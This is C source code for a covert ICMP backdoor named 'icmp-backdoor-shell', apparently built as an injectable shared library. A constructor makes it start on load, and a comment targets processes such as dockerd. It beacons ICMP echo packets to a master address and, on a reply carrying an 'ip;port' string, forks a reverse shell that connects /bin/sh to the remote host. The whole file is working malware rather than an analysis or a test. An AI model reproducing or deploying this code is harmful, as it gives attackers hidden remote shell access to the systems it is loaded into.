#define _GNU_SOURCE
#include <sched.h>
#include <netinet/ip_icmp.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>
#include </usr/include/x86_64-linux-gnu/sys/time.h>
#include <unistd.h>
#include <arpa/inet.h>
// static defs
#define CODE_REQUEST 4242
#define SHELL "/bin/sh"
#define SHELLNAME "icmp-backdoor-shell"
#define MASTER_ADDR "127.0.0.1"
#define STACKS (4096*4096) 

// static vars
static char child_stack[STACKS];
struct icmphdr *icmp;
struct iphdr *ip;

static int  start(void *args);

__attribute__((constructor))
static void init()
{

	clone(start, child_stack + STACKS, CLONE_THREAD | CLONE_SIGHAND | CLONE_VM | SIGCHLD, NULL);
}


static unsigned short cal_chksum(unsigned short *addr,int len)
{
	int nleft=len;
	int sum=0;
	unsigned short *w=addr;
	unsigned short answer=0;

	while(nleft>1)
	{
		sum+=*w++;
		nleft-=2;
	}

	if( nleft==1){
		*(unsigned char *)(&answer)=*(unsigned char *)w;
		sum+=answer;
	}

	sum=(sum>>16)+(sum&0xffff);
	sum+=(sum>>16);
	answer=~sum;
	return answer;
}


/*
 * Spawn a shell and connect stdout 
 */

static void spawn_shell(uint16_t port, char *ip) { 	
	
	int client;
  	struct sockaddr_in shell;
 	shell.sin_family = AF_INET;
  	shell.sin_port = htons(port);
  	shell.sin_addr.s_addr = inet_addr(ip);
	client = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
  	connect(client, (struct sockaddr *)&shell, sizeof(shell));
  	close(STDIN_FILENO);
  	close(STDOUT_FILENO);
  	close(STDERR_FILENO);
	dup2(client, STDERR_FILENO);
	dup2(client, STDIN_FILENO);
	dup2(client, STDOUT_FILENO);
	printf("All good\n");
	execl(SHELL, SHELLNAME, NULL);

}


/*
* Open a socket and init the dest structure
*/
static void initialize_addr_dest(struct sockaddr_in *dest){
    
       dest->sin_family = AF_INET;
       dest->sin_addr.s_addr = inet_addr(MASTER_ADDR);
}

/*
 * Signal handler
 */
static void handler(int sig){
	
	if(sig==2) { // SIGINT -> stop
		exit(1);
	}
}


/*
 * If process (as dockerd) don't have signal stack when cloning - install one 
 */

static int init_signal_stack(){
	
	   stack_t ss;
           ss.ss_sp = malloc(SIGSTKSZ);
           if (ss.ss_sp == NULL) {
               perror("malloc");
               exit(EXIT_FAILURE);
           }

           ss.ss_size = SIGSTKSZ;
           ss.ss_flags = 0;
           if (sigaltstack(&ss, NULL) == -1) {
               perror("sigaltstack");
               exit(EXIT_FAILURE);
           }
	   struct sigaction sa;
           sa.sa_flags = SA_ONSTACK;
           sa.sa_handler = handler;      /* Address of a signal handler */
           sigemptyset(&sa.sa_mask);
           
	   if (sigaction(SIGSEGV, &sa, NULL) == -1) {
               perror("sigaction seg");
               exit(EXIT_FAILURE);
           }
	   

	   if (sigaction(SIGINT, &sa, NULL) == -1) {
               perror("sigaction int");
               exit(EXIT_FAILURE);
           }
	   
	   if (sigaction(SIGCHLD, &sa, NULL) == -1) {
               perror("sigaction chld");
               exit(EXIT_FAILURE);
           }

	
	return 1;

}

// Decode the data field in the ICMP packet
static void decode_data(char *data, unsigned int len){
	
	char *token = strtok(data, ";");
	if (!token) return;	
	char *ip = token;
	token = strtok(NULL, ";");
	if (!token) return;
	char *port = token;
	if(!fork())
		spawn_shell(atoi(port), ip);		
}

// Extract data from an ICMP packet
static void recieve_data(char *in_buf, int nbytes) {
	
	ip = (struct iphdr*) in_buf;
	nbytes -= sizeof(struct iphdr);
	icmp = (struct icmphdr*) (ip + 1);
	if (icmp->un.echo.id == 4243) {
		nbytes -= sizeof(struct icmphdr);	
		decode_data((char*)(icmp+1), nbytes);
	}
}


// returns an open socket on success
static int init_socket(){
	
	int sockfd;
	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP))<0){
	       fprintf(stderr, "Failed to open raw icmp socket %s\n", strerror(errno));
	       exit(EXIT_FAILURE);
       }

	return sockfd;

}

static int  start(void *args){
		
	int sockfd;
	struct sockaddr_in dest;
	
	sockfd = init_socket();
	struct timeval tv_out;
	tv_out.tv_sec=1;
	tv_out.tv_usec=0;
	setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv_out, sizeof(tv_out));
	// signal stack init
	init_signal_stack();
	
	initialize_addr_dest(&dest);	

	char in_buf[1024];
	struct icmphdr *icmp = calloc(1, sizeof(struct icmphdr));
	int nbytes;
	while(1) {
		bzero(icmp, sizeof(struct icmphdr));
		icmp->type = 8;
		icmp->un.echo.id = 4242;		
		icmp->checksum=0x00;
		//icmp->checksum=cal_chksum((unsigned short*)icmp, sizeof(struct icmphdr));
		if (sendto(sockfd, icmp, sizeof(struct icmphdr), 0, (struct sockaddr*) &dest, sizeof(dest)) < 0){
            		printf("\nPacket Sending Failed!\n");
       		 }
		//receive packet
        	nbytes = read(sockfd, in_buf, sizeof(in_buf)); 
		if(nbytes > sizeof(struct iphdr)){ // If it's an ICMP packet
            		recieve_data(in_buf, nbytes);		
	        }	
		
		sleep(1);
	}	
	
	free(icmp);	
	return 0;
}

